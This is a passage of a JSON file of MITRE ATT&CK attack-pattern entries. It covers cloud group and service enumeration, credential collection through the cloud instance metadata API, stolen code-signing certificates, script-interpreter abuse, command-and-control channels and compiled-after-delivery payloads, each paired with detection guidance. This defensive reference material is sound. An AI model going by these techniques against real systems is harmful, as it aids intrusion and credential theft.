365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:15:33.222Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\\n\\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft Msolrole)(Citation: GitHub Raindance)\\n\\nAzure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <code>az ad user get-member-groups</code> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)\",\"external_references\":[{\"external_id\":\"T1069.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1069/003\"},{\"description\":\"Microsoft. (n.d.). Get-MsolRole. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft Msolrole\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0\"},{\"description\":\"Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019.\",\"source_name\":\"GitHub Raindance\",\"url\":\"https://github.com/True-Demon/raindance\"},{\"description\":\"Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft AZ CLI\",\"url\":\"https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest\"},{\"description\":\"Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019.\",\"source_name\":\"Black Hills Red Teaming MS AD Azure, 2018\",\"url\":\"https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/\"}],\"id\":\"attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-12T19:25:12.782Z\",\"name\":\"Cloud Groups\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Azure activity logs\",\"Office 365 account logs\",\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Office 365\",\"Azure AD\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-09-04T14:41:32.317Z\",\"external_references\":[{\"external_id\":\"T1522\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1522\"},{\"description\":\"AWS. (n.d.). Instance Metadata and User Data. Retrieved July 18, 2019.\",\"source_name\":\"AWS Instance Metadata API\",\"url\":\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html\"},{\"description\":\"Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern Day Trojan Horse. Retrieved July 16, 2019.\",\"source_name\":\"RedLock Instance Metadata API 2018\",\"url\":\"https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse\"}],\"id\":\"attack-pattern--1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f\",\"modified\":\"2020-02-11T18:48:48.609Z\",\"name\":\"Cloud Instance Metadata API\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:47:46.619Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\\n\\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\\n\\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\\n\\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\\n\",\"external_references\":[{\"external_id\":\"T1552.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/005\"},{\"description\":\"AWS. (n.d.). Instance Metadata and User Data. Retrieved July 18, 2019.\",\"source_name\":\"AWS Instance Metadata API\",\"url\":\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html\"},{\"description\":\"Krebs, B.. (2019, August 19). What We Can Learn from the Capital One Hack. Retrieved March 25, 2020.\",\"source_name\":\"Krebs Capital One August 2019\",\"url\":\"https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/\"},{\"description\":\"Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern Day Trojan Horse. Retrieved July 16, 2019.\",\"source_name\":\"RedLock Instance Metadata API 2018\",\"url\":\"https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse\"}],\"id\":\"attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T18:18:20.366Z\",\"name\":\"Cloud Instance Metadata API\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"AWS CloudTrail logs\",\"Azure activity logs\"],\"x_mitre_detection\":\"Monitor access to the Instance Metadata API and look for anomalous queries.\\n\\nIt may be possible to detect adversary use of credentials they have obtained. See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\\n\\n\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-30T18:11:24.582Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\\n\\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.\",\"external_references\":[{\"external_id\":\"T1538\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1538\"},{\"description\":\"Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019.\",\"source_name\":\"Google Command Center Dashboard\",\"url\":\"https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard\"},{\"description\":\"Amazon. (n.d.). AWS Console Sign-in Events. Retrieved October 23, 2019.\",\"source_name\":\"AWS Console Sign-in Events\",\"url\":\"https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html\"}],\"id\":\"attack-pattern--e49920b0-6c54-40c1-9571-73723653205f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2019-10-23T14:19:37.289Z\",\"name\":\"Cloud Service Dashboard\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\",\"Azure AD\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-30T13:01:10.120Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. \\n\\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\\n\\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\",\"external_references\":[{\"external_id\":\"T1526\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1526\"},{\"description\":\"Microsoft. (2019, May 20). Azure Resource Manager. Retrieved June 17, 2020.\",\"source_name\":\"Azure - Resource Manager API\",\"url\":\"https://docs.microsoft.com/en-us/rest/api/resources/\"},{\"description\":\"Microsoft. (2016, March 26). Operations overview | Graph API concepts. Retrieved June 18, 2020.\",\"source_name\":\"Azure AD Graph API\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions/azure/ad/graph/howto/azure-ad-graph-api-operations-overview\"},{\"description\":\"Microsoft. (2020). Azure Stormspotter GitHub. Retrieved June 17, 2020.\",\"source_name\":\"Azure - Stormspotter\",\"url\":\"https://github.com/Azure/Stormspotter\"},{\"description\":\"Rhino Security Labs. (2019, August 22). Pacu. Retrieved October 17, 2019.\",\"source_name\":\"GitHub Pacu\",\"url\":\"https://github.com/RhinoSecurityLabs/pacu\"}],\"id\":\"attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-06-23T14:31:41.758Z\",\"name\":\"Cloud Service Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Suzy Schapperle - Microsoft Azure Red Team\",\"Praetorian\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\",\"Azure AD\",\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:31:26.474Z\",\"external_references\":[{\"external_id\":\"T1116\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1116\"},{\"description\":\"Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.\",\"source_name\":\"Wikipedia Code Signing\",\"url\":\"https://en.wikipedia.org/wiki/Code_signing\"},{\"description\":\"Thomas. (2013, July 15). New signed malware called Janicab. Retrieved July 17, 2017.\",\"source_name\":\"Janicab\",\"url\":\"http://www.thesafemac.com/new-signed-malware-called-janicab/\"},{\"description\":\"Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Securelist Digital Certificates\",\"url\":\"https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/\"},{\"description\":\"Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Symantec Digital Certificates\",\"url\":\"http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates\"}],\"id\":\"attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d\",\"modified\":\"2020-02-05T18:59:28.671Z\",\"name\":\"Code Signing\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-05T16:27:37.784Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\\n\\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) \\n\\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. \",\"external_references\":[{\"external_id\":\"T1553.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1553/002\"},{\"description\":\"Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.\",\"source_name\":\"Wikipedia Code Signing\",\"url\":\"https://en.wikipedia.org/wiki/Code_signing\"},{\"description\":\"Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Securelist Digital Certificates\",\"url\":\"https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/\"},{\"description\":\"Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Symantec Digital Certificates\",\"url\":\"http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates\"}],\"id\":\"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-02-10T19:51:01.601Z\",\"name\":\"Code Signing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\"],\"x_mitre_detection\":\"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:49.546Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\\n\\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.\",\"external_references\":[{\"external_id\":\"T1059\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059\"}],\"id\":\"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-25T03:32:51.380Z\",\"name\":\"Command and Scripting Interpreter\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"PowerShell logs\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries\' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\\n\\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_remote_support\":false,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:42.657Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.**\\n\\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\\n\\n* TCP:80 (HTTP)\\n* TCP:443 (HTTPS)\\n* TCP:25 (SMTP)\\n* TCP/UDP:53 (DNS)\\n\\nThey may use the protocol associated with the port or a completely different protocol. \\n\\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \\n\\n* TCP/UDP:135 (RPC)\\n* TCP/UDP:22 (SSH)\\n* TCP/UDP:3389 (RDP)\",\"external_references\":[{\"external_id\":\"T1043\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1043\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-07-06T17:54:28.071Z\",\"name\":\"Commonly Used Port\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Netflow/Enclave netflow\",\"Process use of network\",\"Process monitoring\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:09.379Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.\",\"external_references\":[{\"external_id\":\"T1092\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1092\"}],\"id\":\"attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2019-07-16T20:53:20.583Z\",\"name\":\"Communication Through Removable Media\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Data loss prevention\"],\"x_mitre_detection\":\"Monitor file access on removable media. Detect processes that execute when removable media is mounted.\",\"x_mitre_network_requirements\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-25T20:53:07.719Z\",\"external_references\":[{\"external_id\":\"T1500\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1500\"},{\"description\":\"ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.\",\"source_name\":\"ClearSky MuddyWater Nov 2018\",\"url\":\"https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf\"},{\"description\":\"Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads Info Stealer and Adware. Retrieved April 25, 2019.\",\"source_name\":\"TrendMicro WindowsAppMac\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/\"}],\"id\":\"attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925\",\"modified\":\"2020-03-16T15:38:37.650Z\",\"name\":\"Compile After Delivery\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-16T15:30:57.711Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\\n\\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\",\"external_references\":[{\"external_id\":\"T1027.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027/004\"},{\"description\":\"ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.\",\"source_name\":\"ClearSky MuddyWater Nov 2018\",\"url\":\"https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf\"},{\"description\":\"Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads Info Stealer and Adware. Retrieved April 25, 2019.\",\"source_name\":\"TrendMicro WindowsAppMac\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/\"}],\"id\":\"attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T20:59:32.293Z\",\"name\":\"Compile After Delivery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\",\"Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Signature-based detection\",\"Host intrusion prevention systems\",\"Anti-virus\",\"Binary Analysis\",\"Static File Analysis\"],\"x_mitre_detection\":\"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Compiler software (either native to the system or delivered by the adversary)\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-10-17T00:14:20.652Z\",\"external_references\":[{\"external_id\":\"T1223\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1223\"},{\"description\":\"Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help May 2018\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk\"},{\"description\":\"Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help ActiveX\",\"url\":\"https://msdn.microsoft.com/windows/desktop/ms644670\"},{\"description\":\"Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help Executable Program\",\"url\":\"https://msdn.microsoft.com/windows/desktop/ms524405\"},{\"description\":\"Moe, O. (2017, August 13). Bypassing Device guard UMCI using CHM – CVE-2017-8625. Retrieved October 3, 2018.\",\"source_name\":\"MsitPros CHM Aug 2017\",\"url\":\"https://msitpros.com/?p=3909\"},{\"description\":\"Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer Security Feature Bypass Vulnerability. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft CVE-2017-8625 Aug 2017\",\"url\":\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625\"}],\"id\":\"attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a\",\"modified\":\"2020-01-31T18:59:00.845Z\",\"name\":\"Compiled HTML File\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T18:53:54.377Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\\n\\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)\",\"external_references\":[{\"external_id\":\"T1218.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/001\"},{\"description\":\"Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help May 2018\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk\"},{\"description\":\"Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help ActiveX\",\"url\":\"https://msdn.microsoft.com/windows/desktop/ms644670\"},{\"description\":\"Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved October 3, 2018.\",\"source_name\":\"Microsoft HTML Help Executable Program\",\"url\":\"https://msdn.microsoft.com/windows/desktop/ms524405\"},{\"description\":\"Moe, O. (2017, August 13). Bypassing Device guard UMCI using CHM – CVE-2017-8625. Retrieved October 3, 2018.\",\"source_name\":\"MsitPros CHM Aug 2017\",\"url\":\"https://msitpros.com/?p=3909\"},{\"description\":\"Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer Security Feature Bypass Vulnerability. Retrieved October 3, 